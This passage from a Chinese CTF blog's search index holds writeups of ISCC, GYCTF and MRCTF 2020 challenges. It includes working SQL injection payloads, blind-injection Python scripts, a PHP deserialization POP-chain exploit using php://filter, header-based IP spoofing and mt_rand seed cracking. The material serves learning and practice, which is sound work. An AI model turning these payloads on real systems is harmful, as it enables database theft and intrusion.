后记Web题整体难度并不太难。这些Web题我学到的新知识有：过滤括号()的SQL盲注、计算题脚本编写、过滤空格和#的SQL时间盲注、PHP可逆加密解密算法、JWT伪造","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://qwzf.github.io/tags/Web/"},{"name":"ISCC","slug":"ISCC","permalink":"https://qwzf.github.io/tags/ISCC/"}],"author":"qwzf"},{"title":"ISCC2020部分MISC总结","slug":"ISCC2020部分MISC总结","date":"2020-05-29T14:59:47.814Z","updated":"2020-05-29T15:07:06.639Z","comments":true,"path":"2020/05/29/ISCC2020部分MISC总结/","link":"","permalink":"https://qwzf.github.io/2020/05/29/ISCC2020部分MISC总结/","excerpt":"","text":"前言这次ISCC，不得不说杂项题脑洞真大(脑袋坑太少，就做出了几道)，并且没有Crypto题。但Web题目难度还行(不容易的题，主要是涉及脑洞)，由于擂台题的MISC题太难了，所以主要先总结一下练武题的MISC部分题。并且另起一篇总结Web题。 MISC1：ISCC签到题目难度：简单考察：图片高度+维吉尼亚密码在winhex里改图片高度，得到然后进行维吉尼亚密码解密，并且很容易想到密钥是high MISC2：寻找小明-1题目难度：普通考察：Stegsolve+使用cv2库 cv2模块使用参考：CV2模块使用（详细教程）模块cv2的用法openCV库cv2的使用首先使用Stegsolve查看不同颜色通道，发现在Red plane 0发现一张二维码扫描得到一串数字列表 [257,1,258,2,259,3,260,4,261,5,262,7,263,8,259,277,438,300,455,319,25,300,456,400,66,366,78,300,421,259,452,23] 看到数字列表这种形式，一般考虑对图像进行操作。然后将数字列表的数字，两个一组作为像素点，发现每个点的R颜色通道值的ASCII码就是flag。脑洞真的大。。。于是写出脚本 import cv2 img=cv2.imread(&#39;zd.png&#39;) x=[257,258,259,260,261,262,263,259,438,455,25,456,66,78,421,452] y=[1,2,3,4,5,7,8,277,300,319,300,400,366,300,259,23] for i in range(16): px = img[y[i], x[i]] print(chr(px[2]),end=&quot;&quot;) 跑脚本，得到flag MISC3：ISCC成绩查询-1题目难度：普通考察：Stegsolve+图论的哥尼斯堡七桥问题+栅栏密码使用Stegsolve打开test_ctf.png，查看不同颜色通道，发现一个路径图。看着不太清晰，于是找个脚本把图提取出来(也可以不用提取，直接在Stegsolve的Green plane 1通道看。下边的是我用脚本提取的)：根据群里师傅们的讨论，涉及图论。然后基本确定是一个哥尼斯堡七桥问题。观察到上图只有箭头所示的点是奇度数节点，所以是存在欧拉通路的半欧拉图。然后从两个奇度数点出发，找到符合图片顺序的欧拉通路。连接后为：TRLNCHHAFCIEEIEEPR栅栏密码解密后为：THERAILFENCECIPHERflag：flag{THERAILFENCECIPHER} MISC4：神秘组织的邮件-1题目难度：普通考察：脑洞暂时未搞懂咋做，看知乎师傅们的讨论，可以猜到flag，即flag{加减乘除} MISC5：千层套路题目难度：普通考察：抽帧+拼图+像素点画图+pdf隐藏文字题目是gif动态图，使用Stegsolve的Frame Browser进行抽帧，提取出来8张图片然后进行拼图(在ppt里拼比较快些)，得到然后使用winrar打开题目.gif，发现压缩包(也可以用foremost分离出压缩包)，不过需要密码而拼图得到的结果就是压缩包密码，输入密码，解压。打开1.txt发现箭头所指的应该就是宽高（比较坑的是726是高，141是宽。像素点画图的脚本里会用到）。并且看一下内容，很明显是像素点画图(做MRCTF的千层套路那道题见过)。于是去掉726*141，并改一下格式：然后将之前的脚本改一下x和y的值，得到如下脚本： from PIL import Image x = 141 #x坐标 通过对txt里的行数进行整数分 y = 726 #y坐标 x * y = 行数 im = Image.new(&quot;RGB&quot;, (x, y)) file = open(&#39;1.txt&#39;) for i in range(0, x): for j in range(0, y): line = file.readline() #获取一行的rgb值 line = line[:-2] line = line[1:] #print(line) rgb = line.split(&quot;, &quot;) #分离rgb，文本中逗号后面有空格 im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2]))) im.save(&#39;test2.png&#39;) 跑脚本，得到看这个把我眼睛都快看瞎了。希望有更好的方法。。。。。而这里只有一半flag，接下来看《道德经》第二十八章.pdf文件里是否有内容。由文件里“知其白，守其黑”尝试看看是不是字体为白色。于是复制出来，和上边一半组合，最终得到flag。 MISC6：耳听为实题目难度：很难考察：mp3stego工具+python音频信号处理+……这个题正常做感觉比较难，等有大师傅正常做的wp出来后。再把大师傅的wp链接附上。首先，题目是ABC.mp3，很明显首先想到使用mp3stego工具提取隐藏信息。得到很明显示是一个网盘链接，且密码是对dHc0aQ==的Base64解码。于是打开网盘链接输入分享密码。进行下载，发现依旧是mp3文件，不过使用mp3stego工具毫无作用，其他音频工具也没效果。于是考虑文件分离。文件分离成功，得到ctf-produce.py import wave import numpy as np import os # 读取音频信号 f = wave.open(os.path.abspath(&#39;./flag.wav&#39;), &#39;rb&#39;) # 二进制只读模式，打开音频文件 params = f.getparams() # 返回音频参数，元组：声道数，量化位数(byte单位)，采样频率，采样点数，压缩类型，压缩类型的描述 nchannels, sampwidth, framerate, nframes=params[:4] # 赋值声道数，量化位数，采样频率，采样点数 str = f.readframes(nframes) # 读取采样点数据，字符串类型 wave_data = np.fromstring(str, dtype=np.short) # 字符串转换为short类型 time = np.arange(0, nframes) * (1.0 / framerate) # 通过采样点数和取样频率计算出每个取样的时间 # 语音信号分帧处理 wlen = 100 # 帧长 inc = 50 # 帧移 signal_length = len(wave_data) # 信号总长度 if signal_length &lt;= wlen: # 若信号长度小于一个帧的长度，则帧数 nf 定义为1，否则，计算帧的总长度 nf = 1 else: nf = int(np.ceil((1.0*signal_length-wlen+inc)/inc)) pad_length = int((nf-1)*inc+wlen) # 所有帧加起来总的铺平后的长度 zeros = np.zeros((pad_length-signal_length), dtype=int) # 不够的长度使用0填补 pad_signal = np.concatenate((wave_data,zeros)) # 填补后的信号记为pad_signal indices = np.tile(np.arange(0,wlen),(nf,1))+np.tile(np.arange(0,nf*inc,inc), (wlen,1)).T # 相当于对所有帧的时间点进行抽取，得到nf*wlen长度的矩阵 indices = np.array(indices, dtype=np.int32) # 将indices转化为矩阵 indices = np.random.permutation(indices) frames = pad_signal[indices] # 得到帧信号 frames = frames.flatten() w = wave.open(os.path.abspath(&#39;./flag-RD.wav&#39;), &quot;wb&quot;) # 打开WAV文档 # 配置声道数、量化位数和取样频率 w.setnchannels(nchannels) w.setsampwidth(sampwidth) w.setframerate(framerate*2) # 采样频率至少是信号频率最高频率的两倍以上才能重新恢复为原来的模拟信号 w.writeframes(frames.tostring()) # 将wav_data转换为二进制数据写入文件 w.close() f.close() 使用python代码进行音频信号处理得到的flag-RD.wav。审计然后逆着写出flag.wav的恢复脚本，应该可以得到flag.wav(不会写，有点难)。然后就接不下去了。于是看到一些师傅们在某群里说爆破什么的。于是开个小号，在flag提交框爆破flag，还真的成功了。。果然flag是个弱口令：flag{password} 擂台MISC1：是我DIO哒题目难度：简单考察：LSB隐写+文件分离+Base64因为是png图片，首先尝试是否是LSB隐写，发现存在LSB隐写 Useful_Massage_2(fa09fTjBfRCUyMW9fZGFhYW ElMjFfXyU3RA==) 由于Useful_Massage_2，很明显，上边Useful_Massage_2()里边可能是Base64编码的第二部分。于是继续查找有用信息。先使用binwalk分析查看图片发现有两张png图片，然后使用foremost进行分离，得到一张二维码，扫描得 Useful_Massage_1(SVNDQyU3QmZsQGdfaXN) 两部分括号里的内容按顺序拼接 SVNDQyU3QmZsQGdfaXNfa09fTjBfRCUyMW9fZGFhYW ElMjFfXyU3RA== 然后Base64解码得：ISCC%7Bfl@g_is_kO_N0_D%21o_daaaa%21__%7D然后进行url解码即得flag。 后记做了这些杂项题，总共收获了以下新知识：使用cv2库、图论的哥尼斯堡七桥问题。其他涉及知识点都见过。比如像素点画图、pdf隐藏白色文字等等。另一篇总结与复现Web题及相关知识点。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.github.io/tags/MISC/"},{"name":"ISCC","slug":"ISCC","permalink":"https://qwzf.github.io/tags/ISCC/"}],"author":"qwzf"},{"title":"i春秋2020新春公益赛 GYCTF有关SQL注入题复现","slug":"i春秋2020新春公益赛 GYCTF有关SQL注入题复现","date":"2020-05-02T13:42:13.000Z","updated":"2020-07-08T16:45:46.302Z","comments":true,"path":"2020/05/02/i春秋2020新春公益赛 GYCTF有关SQL注入题复现/","link":"","permalink":"https://qwzf.github.io/2020/05/02/i春秋2020新春公益赛 GYCTF有关SQL注入题复现/","excerpt":"","text":"0x00 前言最近这段时间参加过一些CTF在线竞赛，做过一些Web题，发现SQL注入漏洞出现的频率可真高！不过在做题中也get到了一些Web新知识，现在通过题目复现的方式总结一下。 0x01 blacklist考点：堆叠注入+handler代替select强网杯-随便注改的，但是ban掉了强网杯payload的rename和alter查表 0&#39;; show tables;# 查字段 0&#39;; show columns from FlagHere;# 前边查表、查字段和强网杯随便注一样。但查记录(数据)是通过重命名等操作得到flag，但这个题ban掉了rename和alter。查询大师傅博客发现：MySQL还有一个handler的可以代替select进行查询 handler相关知识 mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。 基本语法 HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE 1.通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。2.通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。3.通过HANDLER tbl_name CLOSE来关闭打开的句柄。 通过索引去查看的话可以按照一定的顺序，获取表中的数据。4.通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。 通过索引列指定一个值，可以指定从哪一行开始。5.通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。 如果不想浏览一个表的所有行，可以使用where和limit子句。测试分析1.不通过索引打开查看表 （1）打开句柄： handler handler_table open; #打开一张名为handler_table表，无返回结果，声明了一个名为handler_table的句柄 （2）查看表数据： handler handler_table read first; #获取句柄的第一行 handler handler_table read next; #获取下一行 （3）关闭句柄： handler handler_table close; #关闭打开的句柄 2.通过索引打开查看表（FIRST,NEXT,PREV,LAST）通过索引查看的话，可以按照索引的升序，从小到大，查看表信息。（1）创建索引： create index handler_index on handler_table(c1); （2）打开句柄： handler handler_table open as p; （3）查看表数据： handler p read handler_index first; #获取句柄第一行 handler p read handler_index next; #获取下一行 handler p read handler_index prev; #获取上一行 handler p read handler_index last; #获取最后一行 （4）关闭句柄： handler p close; 从index为2的地方开始（1） 打开句柄： handler handler_table open as p; （2） 查看表数据： handler p read handler_index = (2); #指定从第二行开始 handler p read handler_index next; handler p read handler_index prev; handler p read handler_index last; （3）关闭句柄： handler p close; 参考博客：mysql查询语句-handler了解完这些，就可以这道题的构造payload了。payload 0&#39;; handler FlagHere open as qwzf; handler qwzf read first; handler qwzf close;# 执行即可得到flag 0x02 Ezsqli考点：无information_schema布尔盲注+无列名盲注 预备知识做这道题前先预备一下知识：参考博客：聊一聊bypass information_schema无需“in”的SQL盲注新春战疫公益赛-ezsqli-出题小记对MYSQL注入相关内容及部分Trick的归类小结 参考大师傅博客后，发现绕过对information_schema的过滤，有以下几种方法： 1、绕过information_schema方法MySQL5.7的新特性 由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。 1.sys.schema_auto_increment_columns作用：简单来说就是用来对表自增ID的监控。 # security库 //该库为sqli-labs自动建立 emails,referers,uagents,users 2.sys.schema_table_statistics_with_buffer schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer查询表的统计信息，其中还包括InnoDB缓冲池统计信息，默认情况下按照增删改查操作的总表I/O延迟时间 sys.x$schema_table_statistics_with_buffer sys.x$ps_schema_table_statistics_io可忽略table_name=’db’，默认的并非我创建。 sys.x$schema_flattened_keys 当然可能还有，这里就先写这么多。3.利用innoDB引擎绕过对information_schema的过滤(但是mysql默认是关闭InnoDB存储引擎的) 2、绕过information_schema、join using()注列名和进行无列名注入1.利用MySQL5.7的新特性获取表名直接用sqli-labs靶场进行测试（1）sys.schema_auto_increment_columns ?id=-1&#39; union select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+ （2）sys.schema_table_statistics_with_buffer ?id=-1&#39; union select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+ （3）sys.x$schema_table_statistics_with_buffer ?id=-1&#39; union select 1,2,group_concat(table_name)from sys.x$schema_table_statistics_with_buffer where table_schema=database()--+ （4）sys.x$ps_schema_table_statistics_io ?id=-1&#39; union select 1,2,group_concat(table_name)from sys.x$ps_schema_table_statistics_io where table_schema=database()--+ （5）sys.x$schema_flattened_keys ?id=-1&#39; union select 1,2,group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()--+ 等等2.join using()注列名 通过系统关键词join可建立两个表之间的内连接。通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。 #获取第一列的列名 select * from(select * from users a join (select * from users)b)c; #获取次列及后续列名 select * from(select * from users a join (select * from users)b using(username))c; select * from(select * from users a join (select * from users)b using(username,password))c #获取第一列的列名 ?id=-1&#39; union select*from (select * from users as a join users b)c--+ #得id #获取次列及后续列名 ?id=-1&#39; union select*from (select * from users as a join users b using(id))c--+ #得username ?id=-1&#39; union select*from (select * from users as a join users b using(id,username))c--+ #password 3.无列名盲注获取数据直接通过select进行盲注。核心payload： (select &#39;admin&#39;,&#39;admin&#39;)&gt;(select * from users limit 1) 子查询之间也可以直接通过&gt;、&lt;、=来进行判断 开始复现学完上边这些后，继续看这道题：1.测试：fuzz一波，发现： 过滤了and or关键字过滤了if不能用information_schema没有单独过滤union和select, 但是过滤了union select，union某某某select之类过滤了sys.schema_auto_increment_columns过滤了join 2 返回V&amp;N2||1=1 返回Nu1L2||1=4 返回V&amp;N2查询的是V&amp;N，如果||后面的表达式为True则返回Nu1L；false则返回V&amp;N。 2.继续测试： 2||substr((select 1),1,1)=2 V&amp;N 2||substr((select 1),1,1)=1 Nu1L 说明可以进行布尔盲注。3.绕过information_schema绕过information_schema可用以下方法：sys.schema_table_statistics_with_buffer或sys.x$schema_table_statistics_with_buffer或sys.x$ps_schema_table_statistics_io等等4.注出表名然后写个脚本注出表名： import requests import string strs = string.printable url = &quot;http://907a8439-ee8f-4e7a-9a97-f2c65389c019.node3.buuoj.cn/index.php&quot; payload = &quot;2 || ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),{0},1))={1}&quot; if __name__ == &quot;__main__&quot;: name = &#39;&#39; for i in range(1,40): char = &#39;&#39; for j in strs: payloads = payload.format(i,ord(j)) data={&#39;id&#39;:payloads} r = requests.post(url=url,data=data) if &quot;Nu1L&quot; in r.text: name += j print(j,end=&#39;&#39;) char = j break if char==&#39;&#39;: break 注出两张表：users233333333333333,f1ag_1s_h3r3_hhhhh5.无列名盲注注出数据因为join被过滤了，所以无法注出列名(字段名)，但可以进行无列名盲注得到数据。参考一下大师傅脚本，写一个脚本： 在这样的按位比较过程中，因为在里层的for()循环，字典顺序是从ASCII码小到大来枚举并比较的，假设正确值为b，那么字典跑到b的时候b=b不满足payload的大于号，只能继续下一轮循环，c&gt;b此时满足了，题目返回真，出现了Nu1L关键字，这个时候就需要记录flag的值了，但是此时这一位的char是c，而真正的flag的这一位应该是b才对，所以flag += chr(char-1)，这就是为什么在存flag时候要往前偏移一位的原因 import requests url = &#39;http://907a8439-ee8f-4e7a-9a97-f2c65389c019.node3.buuoj.cn/index.php&#39; def str2hex(flag): res = &#39;&#39; for i in flag: res += hex(ord(i)) res = &#39;0x&#39; + res.replace(&#39;0x&#39;,&#39;&#39;) return res flag = &#39;&#39; for i in range(1,60): hexchar = &#39;&#39; for char in range(32, 126): hexchar = str2hex(flag+ chr(char)) payload = &#39;2||((select 1,{})&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39;.format(hexchar) #payload = &#39;0^((select 1,{})&gt;(select * from(f1ag_1s_h3r3_hhhhh)))&#39;.format(hexchar) data = {&#39;id&#39;:payload} r = requests.post(url=url,data=data) if &#39;Nu1L&#39; in r.text: flag += chr(char-1) print(flag) break smi1e师傅的exp中用了取反符号~目的也是判断成立，因为MySQL的比较是按位比的。脚本进行了hex()操作，因为MySQL遇到hex会自动转成字符串。(大师傅们太强了，tqqqqqll!!!!) 0x03 easysqli_copy考点：宽字节+PDO堆叠+编码绕过+时间盲注相关知识：PDO场景下的SQL注入探究从宽字节注入认识PDO的原理和正确使用打开题目，发现源码 &lt;?php function check($str){ if(preg_match(&#39;/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&amp;|database/i&#39;,$str,$matches)){ print_r($matches); return 0; }else{ return 1; } } try{ $db = new PDO(&#39;mysql:host=localhost;dbname=pdotest&#39;,&#39;root&#39;,&#39;******&#39;); }catch(Exception $e){ echo $e-&gt;getMessage(); } if(isset($_GET[&#39;id&#39;])){ $id = $_GET[&#39;id&#39;]; }else{ $test = $db-&gt;query(&quot;select balabala from table1&quot;); $res = $test-&gt;fetch(PDO::FETCH_ASSOC); $id = $res[&#39;balabala&#39;]; } if(check($id)){ $query = &quot;select balabala from table1 where 1=?&quot;; $db-&gt;query(&quot;set names gbk&quot;); $row = $db-&gt;prepare($query); $row-&gt;bindParam(1,$id); $row-&gt;execute(); } 发现使用了PDO、set names gbk一般来说PDO预编译是不存在sql注入，但是其中$db-&gt;query(&quot;set names gbk&quot;);就造成了宽字节注入同时发现一些基本的关键字被过滤了，但可以用char()绕过参考P3师傅和Y1ng师傅的解题思路即可： import requests def str2hex(string): c=&#39;0x&#39; a=&#39;&#39; for i in string: a+=hex(ord(i)) return c+a.replace(&#39;0x&#39;,&#39;&#39;) url=&#39;http://0d7a93644ff54a3886e388d2e2d8ac5d71f9fe37e74247d7.changame.ichunqiu.com/?id=&#39; data=&#39;1%df%27;set @a={};prepare test from @a;execute test;&#39; #预编译语句，set设置变量名@和变化的值; #prepare预备一个@a语句，并赋予名称test; #execute执行语句test payload=&#39;select if((ascii(mid((select fllllll4g from table1),{},1))={}),sleep(6),1);&#39; flag=&#39;&#39; for i in range(1,60): for x in range(30,127): newpayload=payload.format(str(i),str(x))#i字符串长度;x是字符ascii newdata=data.format(str2hex(newpayload))#将sql语句转16进制代入预处理语句 a=requests.session() if(a.get(url+newdata).status_code==404): flag+=chr(x) break print(flag) 0x04 后记复现完之后，收获很多。同时不得不慨叹一句：大师傅们ttttttql！！！！我tttttttcl！！！参考博客：i春秋2020新春战“疫”网络安全公益赛GYCTF Writeup 第二天i春秋公益赛 前两天 WEB WriteUp","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://qwzf.github.io/tags/SQL/"},{"name":"BUG","slug":"BUG","permalink":"https://qwzf.github.io/tags/BUG/"},{"name":"handler注入","slug":"handler注入","permalink":"https://qwzf.github.io/tags/handler注入/"},{"name":"无列名盲注","slug":"无列名盲注","permalink":"https://qwzf.github.io/tags/无列名盲注/"},{"name":"宽字节+PDO堆叠","slug":"宽字节-PDO堆叠","permalink":"https://qwzf.github.io/tags/宽字节-PDO堆叠/"}],"author":"qwzf"},{"title":"MRCTF2020部分题的总结与复现","slug":"MRCTF2020部分题的总结与复现","date":"2020-04-10T11:40:42.693Z","updated":"2020-04-10T11:54:37.624Z","comments":true,"path":"2020/04/10/MRCTF2020部分题的总结与复现/","link":"","permalink":"https://qwzf.github.io/2020/04/10/MRCTF2020部分题的总结与复现/","excerpt":"","text":"0x00 前言题目整体来说不太难，毕竟是个新生赛，Web出的大部分题都很简单。但考察的知识点等方面，确实需要总结一下。于是我总结了部分MISC和Web。(Crypto不想总结)。 0x01 WebPYWebsite这个题出的感觉在考脑洞。。。前端js验证很好绕过(然而绕过也没啥用，而且直接就可以访问flag.php，但没有flag)只有这个：最近可能做题做傻了，看到IP竟然没想到IP伪造(如XFF欺骗)，枯了。。。 Ez_bypass这个很容易bypass，数组绕过md5、数字+字母绕过is_numeric()第二步也可以用语句绕过1234567|1=1 EzPopPHP反序列化和pop链我学的不太好(之后再好好学习总结一下)，然后这道题就没做。抽空再补补相关知识。wp说考点就下面这三个：反序列化魔术方法 __construct()//当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __toString() //当一个对象被当作一个字符串使用 __sleep()//在对象在被序列化之前运行 __wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过) __get()//获得一个类的成员变量时调用 __set()//设置一个类的成员变量时调用 __invoke()//调用函数的方式调用一个对象时的回应方法 __call()//当调用一个对象中的不能用的方法的时候就会执行这个函数 public、protected与private在序列化时的区别protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\\0*\\0的前缀。这里的 \\0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \\0 组合。这也许解释了，为什么如果直接在网址上，传递\\0*\\0username会报错，因为实际上并不是\\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。BASE64 Wrapper LFIphp://filter/convert.base64-encode/resource=flag.php这里直接粘上wp上的exp和分析过程，自己大致思考了一下：Exp: &lt;?php class Show{ public $source; public $str; } class Test{ public $p; } class Modifier{ protected $var; function __construct(){ $this-&gt;var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;; } } $s = new Show(); $t = new Test(); $r = new Modifier(); $t-&gt;p = $r; $s-&gt;str = $t; $s-&gt;source = $s; var_dump(urlencode(serialize($s))); ?&gt; 分析 &lt;?php //flag is in flag.php //WTF IS THIS? //Learn From http://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95 //And Crack It! class Modifier { protected $var; public function append($value){ include($value);//8.触发这个include，利用php base64 wrapper 读flag } public function __invoke(){ $this-&gt;append($this-&gt;var);//7.然后会调用到这里 } } class Show{ public $source; public $str; public function __construct($file=&#39;index.php&#39;){ $this-&gt;source = $file; echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;; } public function __toString(){ return $this-&gt;str-&gt;source;//4.这里会调用str-&gt;source的__get(获得一个类的成员变量)那么我们将其设置为Test对象 } public function __wakeup(){ //2.如果pop是个Show,那么调用这里。产生思考：这个地方是可以通过对象属性个数的值大于真实个数的属性，跳过__wakeup的执行 if(preg_match(&quot;/gopher|http|file|ftp|http|dict|\\.\\./i&quot;, $this-&gt;source)) { //3.匹配的时候会调用__toString，即当一个对象被当作一个字符串使用时 echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; } } } class Test{ public $p; public function __construct(){ $this-&gt;p = array(); } public function __get($key){ $function = $this-&gt;p;//5.触发到这里 return $function();//6.()会调用__invoke,我们这里选择Modifier对象 } } if(isset($_GET[&#39;pop&#39;])){ @unserialize($_GET[&#39;pop&#39;]);//1.反序列调用这里 } else{ $a=new Show; highlight_file(__FILE__); } ?&gt; 由exp得到payload ?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D 得到base64编码的flag.php源码，解码得到flag 套娃这道题比较简单。查看源代码，发现： &lt;!-- //1st $query = $_SERVER[&#39;QUERY_STRING&#39;]; if( substr_count($query, &#39;_&#39;) !== 0 || substr_count($query, &#39;%5f&#39;) != 0 ){ die(&#39;Y0u are So cutE!&#39;); } if($_GET[&#39;b_u_p_t&#39;] !== &#39;23333&#39; &amp;&amp; preg_match(&#39;/^23333$/&#39;, $_GET[&#39;b_u_p_t&#39;])){ echo &quot;you are going to the next ~&quot;; } !--&gt; 1.要求传入b_u_p_t，且_或%5f的个数都要为0百度后发现：在URL中GET请求当输入.或空格或_都会被忽略，所以b_u_p_t即b u p t或b.u.p.t2.这个正则的意思是要23333开头和结尾，但值不能是23333。百度后了解到：url的%0a为换行污染，可以绕过这个正则，且值不为23333。放上当时做题截图：然后url输入secrettw.php进入下一关。发现jsfuck编码，解码得post me Merak。POST传入Merak=1可查看源码。 &lt;?php error_reporting(0); include &#39;takeip.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;.&#39;); include &#39;flag.php&#39;; if(isset($_POST[&#39;Merak&#39;])){ highlight_file(__FILE__); die(); } function change($v){ $v = base64_decode($v); $re = &#39;&#39;; for($i=0;$i&lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; } echo &#39;Local access only!&#39;.&quot;&lt;br/&gt;&quot;; $ip = getIp(); if($ip!=&#39;127.0.0.1&#39;) echo &quot;Sorry,you don&#39;t have permission! Your ip is :&quot;.$ip; if($ip === &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39; ){ echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]); echo file_get_contents(change($_GET[&#39;file&#39;])); } ?&gt; 伪造本地ip，测试发现禁了XFF头，然后我用Client-IP头。又发现file_get_contents里有个自定义的change函数执行解密操作于是我根据源码反向写出加密的exp： &lt;?php /*function change($v){ $v = base64_decode($v); $re = &#39;&#39;; for($i=0;$i&lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; }*/ function result($re){ $v = &#39;&#39;; for($i=0;$i&lt;strlen($re);$i++){ $v .=chr(ord($re[$i])-$i*2); } $v=base64_encode($v); return $v; } //echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]); echo result($_GET[&#39;s&#39;]); //echo file_get_contents(change($_GET[&#39;file&#39;])); ?&gt; 得到payload： secrettw.php?2333=php://input&amp;file=ZmpdYSZmXGI= 然后post参数todat is a happy day作为get参数?2333传入的文件内容，最后伪造127.0.0.1提交即可得到flag Ezaudit这个题依旧很简单，之前做过安恒新年赛枯燥的抽奖，和这考察的一模一样，都是在考察mt_rand()函数的PHP伪随机性。但当时没有总结，以至于看到题时找了一会儿才找到之前的做法，痛失一血(唯一一次离一血这么近，被我给荒废了，枯了)。现在总结一下这种类型题的做法：大致思路： 1.发现使用mt_rand()函数，并给出生成字符串的一部分2.用py脚本根据字符串的一部分生成随机数3.php_mt_seed根据生成的随机数爆出seed4.根据seed利用php代码生成完整字符串 php伪随机性如果mt_srand使用同一个seed，生成的随机数是可以爆破出seed的php_mt_seed利用py脚本： str1=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39; str2=&#39;KVQP0LdJKRaV3n9D&#39; str3 = str1[::-1] length = len(str2) res=&#39;&#39; for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39; break print(res) 运行脚本生成随机数 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 利用php_mt_seed我在Kali上使用的。 ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 这里不仅要注意利用php_mt_seed生成的seed，还要注意PHP版本(运用PHP代码根据seed生成完整字符串要用)利用php代码大致说一下这道题的思路：1.根据目录扫描，发现源码泄露www.zip2.打开源码，发现使用mt_rand()生成伪随机数(这里贴一下关键部分) // genarate public_key function public_key($length = 16) { $strings1 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;; $public_key = &#39;&#39;; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; } //genarate private_key function private_key($length = 12) { $strings2 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;; $private_key = &#39;&#39;; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; } $Public_key = public_key(); //$Public_key = KVQP0LdJKRaV3n9D how to get crispr&#39;s private_key??? 